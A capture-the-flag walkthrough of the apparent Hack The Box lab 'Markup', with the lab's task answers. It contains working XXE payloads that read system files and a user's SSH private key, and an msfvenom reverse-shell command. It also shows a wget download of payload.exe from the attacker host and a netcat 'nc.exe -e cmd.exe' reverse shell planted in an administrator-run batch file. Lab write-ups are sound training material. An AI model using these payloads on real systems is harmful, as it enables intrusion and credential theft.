# Markup

---

## Setup

Connected to the VPN, spawned in the target machine, as a first step to make sure the target machine is alive I use a quit `ping` command in the terminal to make sure all is set and store the IP in an environment variable:

```shell
└─$ export IP=10.129.95.192
└─$ echo $IP
10.129.95.192

└─$ ping $IP                                                                          
PING 10.129.95.192 (10.129.95.192) 56(84) bytes of data.
64 bytes from 10.129.95.192: icmp_seq=1 ttl=63 time=68.6 ms
64 bytes from 10.129.95.192: icmp_seq=2 ttl=63 time=68.5 ms
64 bytes from 10.129.95.192: icmp_seq=3 ttl=63 time=68.5 ms
64 bytes from 10.129.95.192: icmp_seq=4 ttl=63 time=68.4 ms
````

All is set!

---

## Enumeration

First, I ran a scan on the target machine to identify open ports and running services that might be vulnerable using [nmap](https://nmap.org) with the following flags:
`-sV`: Determine running services/versions on open ports
`-sC`: Run default scripts
`-v`: Verbose output for more information about the scan
`-oN`: Write the output of the scan into a file

scan result:

```shell
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| tls-alpn: 
|_  http/1.1
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
|_SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
|_ssl-date: TLS randomness does not represent time
|_http-title: MegaShopping
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

Another web application attack, I added the entry of the target machine IP and the domain name `markup.htb` to my `/etc/hosts`

---

## Look For Vulnerability

At first I navigated to the website on port 80 and I was greeted with a login page, I tried some SQL Injection queries but did not seem to work, so I started `Burp Suite` and brute forced login credintials from [Seclists](https://github.com/danielmiessler/SecLists) and `admin:password` combination seemed to work!

![Burp Suite Brute Force](https://imgur.com/sK8tbec.png)

I logged in and kept cruising through the website to see if it receives user input anywhere, and it does! at the `orders` page. I turned on interception on Burp Suite and I saw that the payload to the server on the submit is an [XML v1.0](https://en.wikipedia.org/wiki/XML) payload:

![XML Payload On Submit](https://imgur.com/blgPpqo.png)

I searched online for XML Vulnerabilities and I eventually found XXE (XML External Entity) Injection, A great source of information can be found on [HackTricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity) and [Portswigger](https://portswigger.net/web-security/xxe/xml-entities).

I kept poking around and while looking at the source code of `orders` page I found an HTML comment:

```html
<meta charset="UTF-8">
<title>Goods & Services</title>
<!-- Modified by Daniel : UI-Fix-9092-->
<style>
```

`Daniel` might be a clue of the targetted user on the target machine.

---

## XXE Injection Attack

First step, I wanted to make sure that the target machine is vulnerable it XXE Injection, so I edited the sent payload on Burp Suite and added a poisoned payload to see If the target machine responds. I started a simple HTTP server on my local machine and sent this payload to the target machine, and now time to see if i receive the target's request:

```xml
<?xml version = "1.0"?>
<!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY sp SYSTEM "http://10.10.16.2/"> ]> 
<order>
	<quantity>
		9
	</quantity>
	<item>
		&sp;
	</item>
	<address>
		Hello, Friend!
	</address>
</order>
```

```shell
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80                                                         
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.95.192 - - [20/Sep/2022 04:07:57] "GET / HTTP/1.0" 200 -
````

Now I can read the contents of any file in the target machine, also In my attempts, I saw error messages that confirm that I'm dealing with a Windows operating system machine. I then tried to read the `win.ini` file to further confirm I can read files from the target system with the payload:

```xml
<?xml version = "1.0"?>
<!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY sp SYSTEM "file:///C:/windows/win.ini"> ]>
 <order>
 	<quantity>
 		9
 	</quantity>
 	<item>
 		&sp;
 	</item>
 	<address>
 		Hello, Friend!
 	</address>
 </order>
```

![Get win.ini with Burp Suite](https://imgur.com/WHbqLiS.png)

And since I already have a solid guess of the target username, I went ahead and sent a payload to view the user flag which is normally located in the Desktop folder of the user.

```xml
<?xml version = "1.0"?>
<!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY sp SYSTEM "file:///C:/users/daniel/desktop/user.txt"> ]>
 <order>
 	<quantity>
 		9
 	</quantity>
 	<item>
 		&sp;
 	</item>
 	<address>
 		Hello, Friend!
 	</address>
 </order>
```

And I got the user flag!

![User Flag on Burp Suite With The Poisoned Payload](https://imgur.com/oT0tllJ.png)

---

## Privilege Escalation

At first, I wanted to establish a reverse shell or some sort of a CLI remote access, but after some time of reading online about how I can exploit this, I went back to the `nmap` scan and I found there's an OpenSSH service running on port 22! I went ahead and tried to get the SSH private key with the following payload:

```xml
<?xml version = "1.0"?>
<!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY sp SYSTEM "file:///C:/users/daniel/.ssh/id_rsa"> ]>
 <order>
 	<quantity>
 		9
 	</quantity>
 	<item>
 		&sp;
 	</item>
 	<address>
 		Hello, Friend!
 	</address>
 </order>
```

![Sniffing SSH Key Using Poisoned XXE Burp Suite](https://imgur.com/4vBsCvp.png)

I wrote this rsa key in a file `key` and connected using `ssh` and got a CLI connection:

```shell
┌──(kali㉿kali)-[~]
└─$ chmod 400 key

┌──(kali㉿kali)-[~]
└─$ ssh -i key daniel@$IP
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Users\daniel>
```

Next I checked for my privs - or Daniel's privs - :

```shell
daniel@MARKUP C:\Users\Daniel>powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Daniel> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
PS C:\Users\Daniel> 

```

Nothing I can see of interest, so i kept navigating through the file system trying to find any weird files/directories until I found `Log-Management` folder in `C:\` partition that contains a file `job.bat`:

```shell
PS C:\Log-Management> ls


    Directory: C:\Log-Management


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/6/2020   1:42 AM            346 job.bat


PS C:\Log-Management>
```

```shell
PS C:\Log-Management> cat .\job.bat
@echo off 
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
PS C:\Log-Management>
```

This `.bat` file first checks if the user who executed this file is Administrator, then clear the logs using `wevtutil`, So this process might be running by the administrator on the target machine, i used `ps` in the command line to verify that it's running:

```shell
     55       5      952       4248              2052   1 wevtutil
     55       5      944       4248              3620   1 wevtutil
     55       5      952       4244              3740   1 wevtutil
     55       5      944       4244              5340   1 wevtutil
     55       5      936       4240              7160   1 wevtutil
```

And indeed it was running and the administrator user is constantly running this file! so my target is either to edit the `wevtutil` entry, or edit the root file which is `job.bat`, so I checked if I have permissions to edit it using `icacls`:

```shell
PS C:\Log-Management> icacls .\job.bat
.\job.bat BUILTIN\Users:(F)
          NT AUTHORITY\SYSTEM:(I)(F)
          BUILTIN\Administrators:(I)(F)
          BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
PS C:\Log-Management>
```

This shows that I have permissions to edit this file, since `BUILTIN\Users` have (F) Full access on this file, the privilege check is hard coded in the `.bat` file.

So to gain admin privs, I need to do the following steps:

1. Craft a `.bat` reverse shell payload
2. Start a listener on port 1337
3. Edit `job.bat` file to be my payload
4. Wait for the admin to execute the file
5. Bingo

I started by crafting a simple powershell payload using but I could not bypass security checks, so I just made an `exe` payload using `msfvenom`:

```shell
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=1337 -f exe -o payload.exe
```


Netcat listener:

```shell
└─$ sudo nc -lvnp 1337                                                             
listening on [any] 1337 ...
```

Edit `job.bat` file:

```shell
PS C:\Log-Management> wget http://10.10.16.2/payload.exe -outfile payload.exe
PS C:\Log-Management> echo C:\Log-Management\payload.exe > job.bat
```

but It didn't seem to work, so I decided to attempt a simple `netcat` reverse shell, I first had to download the `nc.exe` binary on my local machine and transfer it using a simple python http server, the I execute the following command on the target machine:

```shell
echo C:\Log-Management\nc.exe -e cmd.exe 10.10.16.2 1337 > C:\Log-Management\job.bat
```

It didn't seem to work at first, but while I was reading online for ways of getting a reverse shell and obfuscating the payload, I noticed I got a connection on my `netcat` listener! and I'm in, I navigated through and got the root flag at `C:\Users\Administrator\Desktop\root.txt`, and yeah, that last reverse shell was very slow and almsot irresponsive.

---

## Tasks & Answers:

**Task 1**: What version of Apache is running on the target's port 80?
> 2.4.41

**Task 2**: What username:password combination logs in successfully?
> admin:password

**Task 3**: What is the word at the top of the page that accepts user input?
> Order

**Task 4**: What XML version is used on the target?
> 1.0

**Task 5**: What does the XXE / XEE attack acronym stand for?
> XML External Entity

**Task 6**: What username can we find on the webpage's HTML code?
> Daniel

**Task 7**: What is the file located in the Log-Management folder on the target?
> job.bat

**Task 8**: What executable is mentioned in the file mentioned before?
> wevtutil.exe

**User Flag**: 
> *******************************7

**Root Flag**: 
> *******************************8

---
